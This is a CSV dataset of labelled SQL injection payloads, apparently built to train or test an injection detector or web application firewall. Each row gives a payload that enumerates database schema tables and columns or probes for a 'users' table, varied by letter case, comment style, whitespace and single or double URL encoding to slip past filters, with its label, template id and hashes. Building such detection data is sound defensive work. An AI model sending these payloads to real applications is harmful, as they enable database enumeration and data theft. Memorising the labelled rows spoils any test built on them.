payload,label,attack_type,variant_type,encoding_type,template_id,normalized_hash,payload_hash,length
id%253D1%2527%2B%2BUNION%2B%2BSELECT%2B%2Btable_name%252C%2B%2Btable_schema%2B%2BFROM%2B%2Binformation_schema.tables%2B%2B%2523,1,sqli_info_schema,case_var|comment_hash|ws_multi_space,double_encoded,SQLI_INFO_SCHEMA_001,272f08de920c13173fdf2b400096a24b,5e436ac933729c10bf70b931ea8b7fc3,127
"id=1%27 UNION+SELECT+column_name, table_name+FROM information_schema.columns+WHERE+table_name%3D%27users%27+/*",1,sqli_info_schema,comment_block_comment,partially_encoded,SQLI_INFO_SCHEMA_002,efc80055325830349f8371e225adb849,0021b41edbf9427e7d96111124b3e18b,110
id=1%27/%2A%2A%2FAnd%2F*%2A%2F(SELECT%2F*%2A/COUNT(%2A)%2F*%2A%2FFrom/**%2Finformation_schema.columns%2F%2A*/WheRe/%2A*%2Ftable_name%3D%27users')>0%2F%2A*/--%2F%2A*%2F-,1,sqli_info_schema,case_var|comment_dash_dash_space|ws_mixed_ws,partially_encoded,SQLI_INFO_SCHEMA_003,b57a996ffb7a7674f68e700e4673b381,d5b7c6a26d8dd3f264d7a89c1ad6ca0b,168
id%3D1%27++anD++%28SELECT++COUNT%28%2A%29++from++information_schema.columns++WHERE++table_name%3D%27users%27%29%3E0++--++-,1,sqli_info_schema,case_var|comment_dash_dash_space|ws_multi_space,url_encoded,SQLI_INFO_SCHEMA_003,0c97b5db8cf0086147b0710a569af98c,489b71245af2f14b7818974d44a6e850,122
id%253D1%2527%2B%2BUNION%2B%2BselECt%2B%2Btable_name%252C%2B%2Btable_schema%2B%2Bfrom%2B%2Binformation_schema.tables%2B%2B%252F%252A,1,sqli_info_schema,case_var|comment_block_comment|ws_multi_space,double_encoded,SQLI_INFO_SCHEMA_001,e38caf332289ff3e4148c051a22de944,5cb0dd88634a38b0d733bf8e1d1f93cb,132
"id%3D1%27%2F%2A*/UNION/*%2A%2FSELECT/*%2A%2Fcolumn_name,%2F%2A%2A%2Ftable_name/**/FROM%2F%2A*%2Finformation_schema.columns%2F%2A%2A%2FWHERE%2F*%2A%2Ftable_name%3D%27users%27/%2A%2A%2F;--%2F%2A*%2F-",1,sqli_info_schema,comment_semicolon_comment|ws_comment_ws,partially_encoded,SQLI_INFO_SCHEMA_002,c35d33bd6e08829c8af4f8a46d8098ef,4f06f91100177264634e6466eaa10b79,197
id%253D1%2527%252520unION%252520select%252520column_name%252C%252520table_name%252520FRom%252520information_schema.columns%252520where%252520table_name%253D%2527users%2527%252520--%252520-,1,sqli_info_schema,case_var|comment_dash_dash_space|ws_url_space,double_encoded,SQLI_INFO_SCHEMA_002,48046ba77dba16c861956e868a866464,d04243f27cf65f1d6a2c81e5e53cd14f,188
id%3D1%27++UNION++SELECT++column_name%2C++table_name++FROM++information_schema.columns++WHERE++table_name%3D%27users%27++--++-,1,sqli_info_schema,comment_dash_dash_space|ws_multi_space,url_encoded,SQLI_INFO_SCHEMA_002,52581607df6ed6cffb4dbd78f066c6fe,91ada904268edc05be27813a06c51222,126
id%3D1%27++And++%28SELECT++COUNT%28%2A%29++from++information_schema.columns++Where++table_name%3D%27users%27%29%3E0++%2F%2A,1,sqli_info_schema,case_var|comment_block_comment|ws_multi_space,url_encoded,SQLI_INFO_SCHEMA_003,f22a4aee1c22a7c633d0dafa774f4b0d,bf0d8a29c9203df89d22428abf56d968,123
"id%3D1%27+UNION+SELECT+column_name, table_name+FROM information_schema.columns WHERE+table_name%3D%27users%27+%3B-- -",1,sqli_info_schema,comment_semicolon_comment,partially_encoded,SQLI_INFO_SCHEMA_002,116d7f4360a5c55890d98d3e907c7dc8,5bd99060b8e10f8003ddbdd81e6aecc5,117
"id=1'%20UNION%20Select%20column_name,%20table_name%20FROM%20information_schema.columns%20WHERE%20table_name='users'%20#",1,sqli_info_schema,case_var|comment_hash|ws_url_space,raw,SQLI_INFO_SCHEMA_002,7a407729c33aa812e284d813d78fb0a9,1736b7a715c62f53be59b6133fd3c137,119
"id%3D1'	UNIon	SelECT	column_name,	table_name	From	information_schema.columns	WHERE	table_name%3D%27users'	%23",1,sqli_info_schema,case_var|comment_url_hash|ws_tab,partially_encoded,SQLI_INFO_SCHEMA_002,9d1f7fde285f12d7989e5d34ec312fa2,b28e7b6bfb88c217b06ac096819cb64b,109
"id=1%27	unION	select	column_name,	table_name	FROM	information_schema.columns	Where	table_name%3D'users%27	/%2A",1,sqli_info_schema,case_var|comment_block_comment|ws_tab,partially_encoded,SQLI_INFO_SCHEMA_002,dfb4a5c9c2bd672d51eefd5655eeb42d,c2e6919fab3ac7422123bf6dc030281f,110
id%253D1%2527%252BUNION%252BSELECT%252Bcolumn_name%252C%252Btable_name%252BFROM%252Binformation_schema.columns%252BWHERE%252Btable_name%253D%2527users%2527%252B%252F%252A,1,sqli_info_schema,comment_block_comment|ws_mixed_ws,double_encoded,SQLI_INFO_SCHEMA_002,62c3dbddcf4c930415d028605a814bc8,baa5282c4a9ee33721e9f385ccff247b,170
id%253D1%2527%252BAND%252B%2528SELECT%252BCOUNT%2528%252A%2529%252BFROM%252Binformation_schema.columns%252BWHERE%252Btable_name%253D%2527users%2527%2529%253E0%252B%252523,1,sqli_info_schema,comment_url_hash|ws_plus,double_encoded,SQLI_INFO_SCHEMA_003,30fd02e20a4f61e0570685355c4e1459,276b197c1a54750afb9b2b8931a3d238,170
id%3D1%27++And++%28SELECT++COUNT%28%2A%29++From++information_schema.columns++Where++table_name%3D%27users%27%29%3E0++%2523,1,sqli_info_schema,case_var|comment_url_hash|ws_multi_space,url_encoded,SQLI_INFO_SCHEMA_003,38886333b8ddfd87a3927c2fbeb8ae25,bec6ee7b3dba693c6d1b898288ab9bfc,122
"id%3D1'+Union+sELecT+table_name,+table_schema fRom+information_schema.tables+%23",1,sqli_info_schema,case_var|comment_url_hash|ws_space,partially_encoded,SQLI_INFO_SCHEMA_001,4256833a7ec7a9a9181e3bcc86d3ed58,990e133017a08320b9d81ffa6e75ba2b,80
"id%3D1'%2F%2A*/union%2F%2A%2A%2FSELECT/%2A%2A%2Ftable_name,%2F%2A%2A/table_schema/%2A%2A/from/%2A*%2Finformation_schema.tables/%2A%2A%2F;--%2F*%2A/-",1,sqli_info_schema,case_var|comment_semicolon_comment|ws_comment_ws,partially_encoded,SQLI_INFO_SCHEMA_001,8c34b3b56fd25065fd65a6d6dcc44562,6fbfb26aab21e37dfa1e27d0053e206b,148
id%253D1%2527%2509UNION%2509SELECT%2509column_name%252C%2509table_name%2509FROM%2509information_schema.columns%2509WHERE%2509table_name%253D%2527users%2527%2509%253B--%2509-,1,sqli_info_schema,comment_semicolon_comment|ws_tab,double_encoded,SQLI_INFO_SCHEMA_002,3e3f043f36870ec787ac7886fcf543f6,5aeafc540dcdc7c2dda1a0156619f419,173
"id%3D1%27 UNION+SELECT+column_name,+table_name+FROM information_schema.columns+WHERE+table_name%3D%27users'+%23",1,sqli_info_schema,comment_url_hash,partially_encoded,SQLI_INFO_SCHEMA_002,06e695604256a7daa5229d10ac72f58b,32ee4d72b9e558580b6a46a4ebe5c989,111
"id%3D1'/%2A*/Union%2F%2A%2A/select%2F%2A%2A%2Fcolumn_name,%2F%2A%2A/table_name/%2A*%2Ffrom%2F%2A*%2Finformation_schema.columns%2F%2A%2A%2FwhEre%2F%2A%2A%2Ftable_name='users%27/*%2A%2F%3B--%2F%2A%2A%2F-",1,sqli_info_schema,case_var|comment_semicolon_comment|ws_comment_ws,partially_encoded,SQLI_INFO_SCHEMA_002,58cc4f0b34d1f9b4d8bed93cb9a13c21,aced1767598f5a881b9e076b485b2f57,201
"id%3D1%27 UNIOn+SELECT table_name,+table_schema+fRom+information_schema.tables /*",1,sqli_info_schema,case_var|comment_block_comment,partially_encoded,SQLI_INFO_SCHEMA_001,f41390db3fa59907c07bb467ba625618,a47be0c75d9263feeb284b16b343263b,81
"id=1'%20UnION%20SeleCt%20table_name,%20table_schema%20FRom%20information_schema.tables%20--",1,sqli_info_schema,case_var|comment_dash_dash|ws_url_space,raw,SQLI_INFO_SCHEMA_001,09d385601c776779ec3043aa27f92b30,89dd390922dafea3b65df0ce9eb0c747,91
"id=1%27+UNION+SELECT+table_name, table_schema+FROM+information_schema.tables %23",1,sqli_info_schema,comment_url_hash,partially_encoded,SQLI_INFO_SCHEMA_001,e982c3be6435c4fd10a3b8022e92e16e,013e8a20751d27375922bc0171d8cbe7,80
"id%3D1%27%20UNION%20Select%20table_name,%20table_schema%20from%20information_schema.tables%20--%20-",1,sqli_info_schema,case_var|comment_dash_dash_space|ws_url_space,partially_encoded,SQLI_INFO_SCHEMA_001,f3f0fbb738d1f9f39d6d1f127a545fcf,c7bd8e8402de82950513507e187a5d72,99
"id%3D1%27 UNION+SELECT table_name,+table_schema+from+information_schema.tables ;-- -",1,sqli_info_schema,case_var|comment_semicolon_comment,partially_encoded,SQLI_INFO_SCHEMA_001,6940fbee523d999c65803d360c97fd99,ce96e2ef2f3492db267a370bd79d5fe8,84
id=1' AND (SELECT COUNT(%2A) FROM information_schema.columns WHERE+table_name%3D%27users%27)%3E0+--+-,1,sqli_info_schema,comment_dash_dash_space|ws_space,partially_encoded,SQLI_INFO_SCHEMA_003,c04ada9cb41f2f72959304a958cd7ae7,7718f7921afea5ce9991aeb9fa057692,101
"id%3D1'%20UNION%20select%20table_name,%20table_schema%20FROM%20information_schema.tables%20%3B--%20-",1,sqli_info_schema,case_var|comment_semicolon_comment|ws_url_space,partially_encoded,SQLI_INFO_SCHEMA_001,75126c53050f5fc870d7e2856da4c4e7,ed4fe908eab1d2fab7437a0fb10d7606,100
"id%3D1%27 UNION+SELECT+column_name, table_name+FROM information_schema.columns WHERE+table_name=%27users%27 %3B--+-",1,sqli_info_schema,comment_semicolon_comment,partially_encoded,SQLI_INFO_SCHEMA_002,4f83f8c476e7c18309f5af326bd6ad8e,9fc1ef293e59cc903e660250a8a83030,115
"id=1%27+uNioN seleCT+table_name, table_schema+fRom information_schema.tables %23",1,sqli_info_schema,case_var|comment_url_hash,partially_encoded,SQLI_INFO_SCHEMA_001,2de3c8be4393ba8b15096e0f65003cd9,05f7d3b9638813db2aa8be7be7a437f1,80
id%3D1%27+AND (SELECT+COUNT(*)+FROM information_schema.columns+WHERE+table_name='users%27)>0+--+-,1,sqli_info_schema,comment_dash_dash_space,partially_encoded,SQLI_INFO_SCHEMA_003,6f6e36534f7f7bd7f84d7218ba55ef92,fd0b3b6dc2c771724dcc0f102999501d,97
id=1'/**/AND/**/(SELECT/**/COUNT(*)/**/From/**/information_schema.columns/**/where/**/table_name='users')>0/**//*,1,sqli_info_schema,case_var|comment_block_comment|ws_comment_ws,raw,SQLI_INFO_SCHEMA_003,386d2ee907929c36b1c57aa81d83824b,f475c248ca41ee976d5a4dc6542e9af1,113
id%253D1%2527%2509uNIon%2509SELECT%2509column_name%252C%2509table_name%2509FrOm%2509information_schema.columns%2509Where%2509table_name%253D%2527users%2527%2509--,1,sqli_info_schema,case_var|comment_dash_dash|ws_tab,double_encoded,SQLI_INFO_SCHEMA_002,a54875787c5f5773fef48948512b5f58,48eed10b3a63a33da6b2632548bae821,162
"id%3D1'+UNION+SELECT+column_name,+table_name+FROM+information_schema.columns+WHERE+table_name%3D'users%27+#",1,sqli_info_schema,comment_hash|ws_plus,partially_encoded,SQLI_INFO_SCHEMA_002,9e611d702a3b1b61787c29c350652958,3df6ca1f1c3af4033b2efe25a7d7401a,107
"id%3D1'%2F%2A*%2FUnion%2F%2A*%2FSelect%2F%2A*%2Fcolumn_name,%2F%2A*%2Ftable_name%2F*%2A/From/*%2A%2Finformation_schema.columns%2F%2A%2A%2FWhEre%2F%2A*%2Ftable_name='users%27%2F%2A%2A%2F--/*%2A%2F-",1,sqli_info_schema,case_var|comment_dash_dash_space|ws_comment_ws,partially_encoded,SQLI_INFO_SCHEMA_002,9fc79907a717d8ddb91594df6050d5ce,260991c7dc6582fb59213755ef257a30,196
"id=1%27/*%2A/UNION%2F%2A%2A/SELECT%2F%2A*/table_name,/**/table_schema%2F*%2A/FROM/%2A%2A%2Finformation_schema.tables/**%2F--",1,sqli_info_schema,comment_dash_dash|ws_mixed_ws,partially_encoded,SQLI_INFO_SCHEMA_001,b864900eb24b9b4beb2211292e408111,9c1b771e4e890a6626c2c0b893ca05be,124
"id%3D1' +UNION  SELECT++column_name,++table_name +FROM +information_schema.columns++WHERE++table_name%3D%27users'++%23",1,sqli_info_schema,comment_hash|ws_multi_space,partially_encoded,SQLI_INFO_SCHEMA_002,0b114457e69c43c5d64b634a7b54ea14,e838317d3e8ea07ae5f80b3af8fc46e2,118
"id=1'+UNION+SELECT+column_name, table_name FROM+information_schema.columns+wHeRE+table_name%3D'users%27 %23",1,sqli_info_schema,case_var|comment_url_hash,partially_encoded,SQLI_INFO_SCHEMA_002,5a8310b5d69f646571a57e7987c92a29,813c3daab74353507434e6b5a77488cd,107
"id%3D1%27%2F%2A*%2FunIon%2F**%2FSELECT%2F%2A%2A%2Ftable_name,%2F%2A%2A%2Ftable_schema%2F**%2FFROM/*%2A/information_schema.tables/%2A%2A%2F--%2F%2A%2A/-",1,sqli_info_schema,case_var|comment_dash_dash_space|ws_comment_ws,partially_encoded,SQLI_INFO_SCHEMA_001,434d8a960d1c8690695db6b8ee4dd4af,1a70e7455bc99a8bc5bdbeb7514119cc,151
id%3D1%27 AND+(SELECT+COUNT(%2A) FROM information_schema.columns+WHERE+table_name=%27users%27)>0+%3B--+-,1,sqli_info_schema,comment_semicolon_comment|ws_space,partially_encoded,SQLI_INFO_SCHEMA_003,f4b73db17999036e8af22376f38ab40e,3f20f2c34f8fa59c96873c06465cfe86,104
id%3D1%27%2520UNION%2520SELECT%2520column_name%2C%2520table_name%2520FROM%2520information_schema.columns%2520WHERE%2520table_name%3D%27users%27%2520%3B--%2520-,1,sqli_info_schema,comment_semicolon_comment|ws_url_space,url_encoded,SQLI_INFO_SCHEMA_002,ba0c2b2f7de2bdcb79694d7d568107e8,1040083e11a22389516b7eed23686f62,159
id%3D1%27+And+(SELECT+COUNT(%2A)+From+information_schema.columns+where+table_name%3D'users%27)>0+%3B--+-,1,sqli_info_schema,case_var|comment_semicolon_comment|ws_mixed_ws,partially_encoded,SQLI_INFO_SCHEMA_003,4871fa1c908273346f41b04ae66c0120,0c33208c395a7ef6ee62f28859a74607,104
"id%3D1%27+UNION SELECT table_name, table_schema FROM+information_schema.tables+--",1,sqli_info_schema,comment_dash_dash,partially_encoded,SQLI_INFO_SCHEMA_001,30dcfde0bf94787ed57eb3fbfe59c451,d6dcfd64850c8fc5f59d9997cbd45d24,81
"id=1'+UNION+SELECT+table_name,+table_schema+FROM+information_schema.tables+#",1,sqli_info_schema,comment_hash|ws_plus,raw,SQLI_INFO_SCHEMA_001,f8faac0ebebd337ccd8e14532e1e3853,08452a122e147f19cbf94b13fce0aeb5,76
"id=1'+UNION Select+table_name,+table_schema From+information_schema.tables+-- -",1,sqli_info_schema,case_var|comment_dash_dash_space,partially_encoded,SQLI_INFO_SCHEMA_001,bc78d7a7f686db658d83812c07c9bfce,b3fcb71099dfc6bd51de681f43d1c2a4,79
"id=1%27+UNION SELECT+column_name,+table_name FROM+information_schema.columns WHERE+table_name=%27users%27+%23",1,sqli_info_schema,comment_url_hash,partially_encoded,SQLI_INFO_SCHEMA_002,493ccdca3b7fa4bca92f63cd14b9cc62,b70ddc01fb7e38169326dbe460f336ee,109
"id%3D1%27 UNION SELECT column_name, table_name FROM+information_schema.columns+WHERE table_name%3D%27users' %2F%2A",1,sqli_info_schema,comment_block_comment,partially_encoded,SQLI_INFO_SCHEMA_002,9a8207fb7ba87f1d18ca36263ef39ad1,7ce9fd717627303068b827f00ec7d23d,114
"id=1%27  +UNION++ SELECT ++table_name, ++table_schema+ +FROM+  information_schema.tables ++%23",1,sqli_info_schema,comment_hash|ws_mixed_ws,partially_encoded,SQLI_INFO_SCHEMA_001,c8e4699a0d7939d89ca752cf536ce84e,bc2508004fe9ef45dd4ecd0a34305af9,94
id%3D1%27%2BUNION%2BSELECT%2Btable_name%2C%2Btable_schema%2BFROM%2Binformation_schema.tables%2B%23,1,sqli_info_schema,comment_hash|ws_plus,url_encoded,SQLI_INFO_SCHEMA_001,0f8c835371d63569d581a0dbf377a73a,bc1434fd331e1ea65a2c447e793fd265,98
id%3D1%27%2F%2A%2A%2FAND%2F%2A%2A%2F(SELECT%2F%2A%2A%2FCOUNT(%2A)%2F**/from%2F%2A*/information_schema.columns/*%2A%2FWhere/*%2A%2Ftable_name%3D'users%27)%3E0%2F*%2A/%2F%2A,1,sqli_info_schema,case_var|comment_block_comment|ws_comment_ws,partially_encoded,SQLI_INFO_SCHEMA_003,a91eb3d81f51234965e1369cce363b5a,f9b72f0a7301d7806025a222ff57fdfd,171
id%3D1'+AND+(SELECT+COUNT(%2A) FROM+information_schema.columns WHERE table_name%3D%27users%27)%3E0 -- -,1,sqli_info_schema,comment_dash_dash_space,partially_encoded,SQLI_INFO_SCHEMA_003,d75035721922b54f11b618c234cde567,6506f34899c5c046e9d9e46773c43a05,103
id%253D1%2527%252520AND%252520%2528SELECT%252520COUNT%2528%252A%2529%252520From%252520information_schema.columns%252520WHeRE%252520table_name%253D%2527users%2527%2529%253E0%252520%252523,1,sqli_info_schema,case_var|comment_url_hash|ws_url_space,double_encoded,SQLI_INFO_SCHEMA_003,e85429b57be9568e903f4662c19ba8e8,578880f7ef0ca6f6305bae53ed0cc12d,186
id%253D1%2527%2B%2B%2BAnd%2B%2B%2B%2528SELECT%2B%2B%2BCOUNT%2528%252A%2529%2B%2B%2BfrOm%2B%2B%2Binformation_schema.columns%2B%2B%2Bwhere%2B%2B%2Btable_name%253D%2527users%2527%2529%253E0%2B%2B%2B%252F%252A,1,sqli_info_schema,case_var|comment_block_comment|ws_mixed_ws,double_encoded,SQLI_INFO_SCHEMA_003,9ebcc39af0e3c36c31e4b524e739ff6b,4c7d14deeb5a8312c43b6e6c8eb637c4,205
id%3D1%27++and++%28SELECT++COUNT%28%2A%29++From++information_schema.columns++WHERE++table_name%3D%27users%27%29%3E0++%3B--++-,1,sqli_info_schema,case_var|comment_semicolon_comment|ws_multi_space,url_encoded,SQLI_INFO_SCHEMA_003,b7c57930a79a2cc825d343d5a6981240,5f43e1998e51f570f37f4ec9d6125925,125
"id=1'/**/Union/**/Select/**/table_name,/**/table_schema/**/from/**/information_schema.tables/**/%23",1,sqli_info_schema,case_var|comment_url_hash|ws_comment_ws,raw,SQLI_INFO_SCHEMA_001,83d766d9c5a0ccf8eed99dcecbff6ebb,020d5c1b7b2dc3ee7ddc4a6be48265fa,99
"id%3D1'+UNION SELECT table_name, table_schema+FROM+information_schema.tables+%2F%2A",1,sqli_info_schema,comment_block_comment,partially_encoded,SQLI_INFO_SCHEMA_001,1c9813bbaa2625dd7a25de28d39f04cb,cb80258cfe7e967548d71dfabd35178d,83
id%3D1%27%2F*%2A/AND%2F*%2A/(SELECT/%2A*%2FCOUNT(%2A)%2F%2A%2A/FROM%2F%2A%2A/information_schema.columns%2F%2A*/WHERE/**%2Ftable_name=%27users%27)%3E0%2F*%2A%2F%23,1,sqli_info_schema,comment_hash|ws_comment_ws,partially_encoded,SQLI_INFO_SCHEMA_003,0686655f68af96826d30232e64e2d30d,fa0b4ed0649711e4b8b2305bb2bb091e,162
id%3D1%27%20AND%20(SELECT%20COUNT(%2A)%20FROM%20information_schema.columns%20WHERE%20table_name%3D%27users')>0%20%23,1,sqli_info_schema,comment_url_hash|ws_mixed_ws,partially_encoded,SQLI_INFO_SCHEMA_003,9ce319ca4cb05d9f84940f81bcb54593,e4f89d5c129af635747c1b2f4c215e16,116
"id=1%27 Union seLect column_name, table_name+frOm+information_schema.columns whERE table_name%3D'users%27+%23",1,sqli_info_schema,case_var|comment_url_hash,partially_encoded,SQLI_INFO_SCHEMA_002,6e216459753d922c1dafe83775521110,448527a678b2766c034128548810fe69,109
"id%3D1%27+UNION+SELECT+column_name,+table_name+FROM+information_schema.columns+Where+table_name%3D%27users%27+%3B--+-",1,sqli_info_schema,case_var|comment_semicolon_comment|ws_plus,partially_encoded,SQLI_INFO_SCHEMA_002,0d42a25d16410e3a31b6f4ec212f2de1,0d4aec9770a8bb8ee436f810b95bc463,117
id%3D1' AnD+(SELECT+COUNT(%2A)+from+information_schema.columns where table_name%3D%27users%27)>0 %23,1,sqli_info_schema,case_var|comment_url_hash,partially_encoded,SQLI_INFO_SCHEMA_003,0ce6469fc5cb61f1c8a0d7edb138989b,2a40d0e911a8c429a95078ff1d45fd85,100
id=1'/**/And/**/(SELECT/**/COUNT(*)/**/From/**/information_schema.columns/**/WhERe/**/table_name='users')>0/**/%23,1,sqli_info_schema,case_var|comment_url_hash|ws_comment_ws,raw,SQLI_INFO_SCHEMA_003,50ee6ff993f61dd6d0222aaf36a9c45a,4c6ec5d28f0ce04e1b9473e376282c66,114
id%3D1'+AND (SELECT+COUNT(%2A)+FROM+information_schema.columns WHERE+table_name%3D'users%27)>0+%3B--+-,1,sqli_info_schema,comment_semicolon_comment,partially_encoded,SQLI_INFO_SCHEMA_003,422ac6671ac04696edda6fe1e10a6e04,e1409ca959e9073fc9a9fc16783450a2,102
id%253D1%2527%252BUnion%252Bselect%252Btable_name%252C%252Btable_schema%252BFrom%252Binformation_schema.tables%252B%252523,1,sqli_info_schema,case_var|comment_url_hash|ws_plus,double_encoded,SQLI_INFO_SCHEMA_001,cbab45ca82526ed4e1e144da761b3411,8fdace14cb67fbce68bdf445fb261584,122
"id%3D1%27+UNION+SELECT+column_name,+table_name+FROM+information_schema.columns+WHERE+table_name%3D%27users%27+%23",1,sqli_info_schema,comment_url_hash|ws_plus,partially_encoded,SQLI_INFO_SCHEMA_002,c2fed31e49a8d10dcaafc3cc85d198bc,3b57e07093b418768a811a1f32ffaaff,113
"id=1'%20Union%20SELECT%20table_name,%20table_schema%20fROM%20information_schema.tables%20/*",1,sqli_info_schema,case_var|comment_block_comment|ws_mixed_ws,raw,SQLI_INFO_SCHEMA_001,122718406cd030e0d53281286fc2e03f,e6a4deabb5bfe902a928b4de0ef972fe,91
id%3D1'+AND+(SELECT+COUNT(*) FROM information_schema.columns+WHERE+table_name%3D'users%27)%3E0+%23,1,sqli_info_schema,comment_hash|ws_space,partially_encoded,SQLI_INFO_SCHEMA_003,9cc10512f22d8314878a9a40f0cb336c,d4985445ab62eede0c95c642a7088ed7,98
id%253D1%2527%252520Union%252520Select%252520table_name%252C%252520table_schema%252520From%252520information_schema.tables%252520--,1,sqli_info_schema,case_var|comment_dash_dash|ws_mixed_ws,double_encoded,SQLI_INFO_SCHEMA_001,62257f92e37fe3ee37d209f9893fbe21,fad74f738583de3406868ba0ec0376af,131
"id%3D1%27 union+SeLEcT+column_name,+table_name+From+information_schema.columns+WHEre table_name%3D'users%27+--",1,sqli_info_schema,case_var|comment_dash_dash,partially_encoded,SQLI_INFO_SCHEMA_002,48ca6255508650cc8586c97a047135a2,bf297198f3f64f47cdcd176c33481961,110
id%253D1%2527%2B%2BaND%2B%2B%2528SELECT%2B%2BCOUNT%2528%252A%2529%2B%2BFROM%2B%2Binformation_schema.columns%2B%2BwHERe%2B%2Btable_name%253D%2527users%2527%2529%253E0%2B%2B%252F%252A,1,sqli_info_schema,case_var|comment_block_comment|ws_multi_space,double_encoded,SQLI_INFO_SCHEMA_003,41bc84212ecfcf1558ba667b1ab3acd5,397f18d2d96e45cac3579bab85a2384b,181
"id%3D1%27 union+selEct+column_name,+table_name+FROm+information_schema.columns+where+table_name%3D%27users'+%23",1,sqli_info_schema,case_var|comment_url_hash|ws_space,partially_encoded,SQLI_INFO_SCHEMA_002,7a40e1dc67567364ae2fb460deb1bd98,8aeb911ff42024c180d6c4e91d391614,111
"id%3D1' +UnION  SELECT+ table_name,+ table_schema+ FROM  information_schema.tables+ /*",1,sqli_info_schema,case_var|comment_block_comment|ws_multi_space,partially_encoded,SQLI_INFO_SCHEMA_001,9b3315aa64714f34f399e3d4fb22cacc,2da1c1526e89b63dcce1beb7521eed29,86
id%253D1%2527%2B%2Band%2B%2B%2528SELECT%2B%2BCOUNT%2528%252A%2529%2B%2Bfrom%2B%2Binformation_schema.columns%2B%2BWheRe%2B%2Btable_name%253D%2527users%2527%2529%253E0%2B%2B%252523,1,sqli_info_schema,case_var|comment_url_hash|ws_multi_space,double_encoded,SQLI_INFO_SCHEMA_003,e0c4a4d08e60c3d37d0c9b2db6f2029e,befa82feb16aebe6cb571cc1eebf6517,178
"id%3D1%27+union+Select+table_name,+table_schema+From+information_schema.tables+%2F%2A",1,sqli_info_schema,case_var|comment_block_comment|ws_mixed_ws,partially_encoded,SQLI_INFO_SCHEMA_001,5fa403585d53e5e66e35bff89cca5037,1feb26e8510dc4958460fdfd0d85ab32,85
"id%3D1' UNION SELECT+table_name,+table_schema+FROM+information_schema.tables+%2F*",1,sqli_info_schema,comment_block_comment|ws_space,partially_encoded,SQLI_INFO_SCHEMA_001,b6c67a2086bc4dbc0a72d67473a0607a,353e341a35cdb11ae702a64e49e07d3f,81
id%3D1%27%20AND%20(SELECT%20COUNT(%2A)%20FROM%20information_schema.columns%20WHERE%20table_name='users%27)%3E0%20%23,1,sqli_info_schema,comment_url_hash|ws_url_space,partially_encoded,SQLI_INFO_SCHEMA_003,b898769c5bea90961508829506e5d776,459cb034d8bac2e3dc47275628c4ae60,116
id=%27%20%4f%52%20%31%3d%31,1,sqli_encoded,case_var|ws_url_space,partially_encoded,SQLI_ENCODED_003,aa6c30cf63a25a06c7ae6ef627669b94,aa6c30cf63a25a06c7ae6ef627669b94,27
